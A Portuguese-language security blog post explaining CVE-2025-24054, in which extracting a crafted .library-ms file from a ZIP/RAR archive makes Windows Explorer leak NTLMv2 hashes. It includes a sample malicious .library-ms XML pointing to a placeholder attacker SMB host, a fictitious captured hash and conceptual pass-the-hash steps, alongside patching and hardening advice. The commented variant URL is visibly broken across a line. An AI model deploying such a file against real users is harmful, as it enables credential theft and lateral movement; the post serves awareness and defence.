---
title: "Alerta de Segurança: Vazamento de Hash NTLM (CVE-2025-24054) ao Extrair Arquivos ZIP/RAR"
date: 2025-05-31T15:00:00-03:00
description: "Entenda a vulnerabilidade CVE-2025-24054 que permite o vazamento de hashes NTLMv2 através de arquivos .library-ms maliciosos em arquivos ZIP ou RAR e como a Microsoft a corrigiu."
keywords: ["CVE-2025-24054", "NTLM Hash Leak", "Windows Explorer", "Vulnerabilidade", "Segurança Windows", "ZIP", "RAR", ".library-ms", "Patch Tuesday"]
author: "Hugo Robot"
images:
  - images/SemTitulo-1.png
  - images/SemTitulo-2.png
draft: false
tags: ["CVE", "Segurança Windows", "Vulnerabilidade", "NTLM", "Microsoft"]
categories: ["Segurança Cibernética", "Alertas"]
---

Recentemente, uma vulnerabilidade interessante (originalmente referenciada como CVE-2025-24071, agora atualizada para **CVE-2025-24054**) foi detalhada, expondo como hashes NTLMv2 de usuários do Windows podem ser capturados por invasores através de um método engenhoso envolvendo arquivos compactados ZIP ou RAR.

Vamos entender como essa falha funciona e o que foi feito a respeito.

## O Que é a Vulnerabilidade CVE-2025-24054?

A falha reside na maneira como o **Windows Explorer** lida com arquivos de Biblioteca do Windows (`.library-ms`) quando eles são extraídos de um arquivo compactado (como `.zip` ou `.rar`).

Um invasor pode criar um arquivo `.library-ms` malicioso que contém um caminho apontando para um servidor SMB (Server Message Block) sob seu controle. Quando um usuário desavisado baixa um arquivo ZIP/RAR contendo este arquivo `.library-ms` e o extrai, o Windows Explorer tenta automaticamente processar e indexar o conteúdo da "biblioteca".

Ao encontrar o caminho SMB malicioso dentro do arquivo `.library-ms`, o Windows Explorer tenta se conectar a esse servidor. Durante essa tentativa de conexão, ocorre um handshake de autenticação NTLM (NT LAN Manager), e o **hash NTLMv2** do usuário é enviado para o servidor SMB do invasor.

## Impacto do Vazamento de Hash NTLMv2

Com o hash NTLMv2 da vítima em mãos, um invasor pode:

- **Tentar ataques de "Pass-the-Hash"**: Em ambientes de rede corporativa, esses hashes podem ser usados para se autenticar em outros sistemas como se fosse o usuário legítimo, sem a necessidade de conhecer a senha original.
- **Tentar Quebra de Senha Offline**: O hash NTLMv2 pode ser submetido a ferramentas de cracking para tentar descobrir a senha de texto puro do usuário. A força da senha e a capacidade computacional do invasor influenciam o sucesso dessa tentativa.

## Sistemas Afetados

A vulnerabilidade afeta o **Windows Explorer** em versões do Windows que processam automaticamente arquivos `.library-ms`.

## Correção e Mitigação

A boa notícia é que a **Microsoft já corrigiu esta vulnerabilidade**. A correção foi disponibilizada no "Patch Tuesday" de Março. É crucial que os usuários do Windows mantenham seus sistemas atualizados com os últimos patches de segurança da Microsoft para se protegerem contra esta e outras ameaças.

Portanto, a principal recomendação é:

- **Aplique todas as atualizações de segurança do Windows o mais rápido possível.**

Manter-se informado sobre essas vulnerabilidades e aplicar as correções diligentemente são passos fundamentais para a segurança digital.

# Como o Ataque Funciona: O Apontamento SMB Malicioso

1. **Criação do Arquivo Malicioso**: Um invasor cria um arquivo `library-ms` especialmente modificado. Dentro deste arquivo XML, ele especifica um caminho para um local de rede que aponta para um servidor SMB sob seu controle.

   - **O que é SMB (Server Message Block)?** De forma rápida, SMB é um protocolo de rede usado principalmente pelo Windows para compartilhamento de arquivos, impressoras e outros recursos em uma rede.

2. **Exemplo de Conteúdo Malicioso no `.library-ms`**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
    <name>Fotos Inocentes</name>
    <searchConnectorDescriptionList>
        <searchConnectorDescription>
            <isDefaultSaveLocation>true</isDefaultSaveLocation>
            <simpleLocation>
                <url>file://///servidor-do-atacante.com/recurso_malicioso</url>
                <!-- Outra variação poderia ser: <url>\servidor-do-atacante.com
ecurso_malicioso</url> -->
            </simpleLocation>
        </searchConnectorDescription>
    </searchConnectorDescriptionList>
</libraryDescription>
```

A parte crucial é `<url>file://///servidor-do-atacante.com/recurso_malicioso</url>`, que instrui o Explorer a tentar acessar um compartilhamento SMB no servidor do atacante.

3. **Entrega e Extração**: O invasor comprime este arquivo `.library-ms` (e talvez outros arquivos isca) em um arquivo `.zip` ou `.rar` e o envia para a vítima.

4. **A Mágica (Ruim) Acontece**: Quando o usuário desavisado baixa e extrai o conteúdo do arquivo ZIP/RAR, o Windows Explorer tenta se conectar automaticamente ao caminho SMB especificado.

5. **Vazamento do Hash**: Durante essa tentativa de conexão automática ao servidor SMB do atacante, o Windows envia as credenciais do usuário na forma de um handshake de autenticação NTLM. O servidor do atacante captura o **hash NTLMv2** do usuário.

**Usuário Fictício**: `MEUDOMINIO\UsuarioAlvo`  
**Hash NTLMv2 Capturado (Exemplo Fictício)**:  
`UsuarioAlvo::MEUDOMINIO:1122334455667788:AABBCCDDEEFF00112233445566778899:0101000000000000009a8b7c6d5e4f3a0000000002000000...`

## Ataques Possíveis com o Hash

- **Quebra de Senha Offline**: O hash NTLMv2 pode ser submetido a ferramentas como Hashcat ou John the Ripper com wordlists para tentar descobrir a senha real.
- **Ataques de "Pass-the-Hash" (PtH)**: O invasor usa o hash diretamente para se autenticar.

### Exemplo Conceitual de PtH

1. O atacante capturou o hash NTLMv2 de `MEUDOMINIO\UsuarioAlvo`.
2. Esse usuário também é administrador de um servidor chamado "SERVIDOR_ALVO".
3. O atacante usa o hash com ferramentas como PsExec ou Impacket para acessar esse servidor.
4. Se o servidor aceitar NTLM, o atacante obtém acesso como administrador.

## Recomendações

1. **Mantenha o Windows Atualizado**
2. **Cuidado com arquivos ZIP/RAR de fontes desconhecidas**
3. **Ambientes corporativos**:
   - Desative NTLM se possível, use Kerberos
   - Restrinja conexões SMB externas
   - Monitore tentativas de autenticação NTLM suspeitas

## Conclusão

A CVE-2025-24054 mostra como algo simples como extrair um arquivo pode expor credenciais sensíveis. A correção já está disponível, mas a compreensão do vetor de ataque é essencial para defesa preventiva.

---

*Ficou curioso para ver como um ataque de captura de hash NTLM funciona na prática?*

Não perca nosso próximo post: **"Explorando na Prática: Capturando Hashes NTLM com Kali Linux e VMs"**

---

<!-- Imagem no final da página -->

![Imagem no final da página](/images/SemTitulo-2.png)

<!-- Versão alternativa com HTML -->
<img src="/images/SemTitulo-2.png" alt="Imagem final da página" style="max-width: 80%; height: auto; display: block; margin: 0 auto;" />
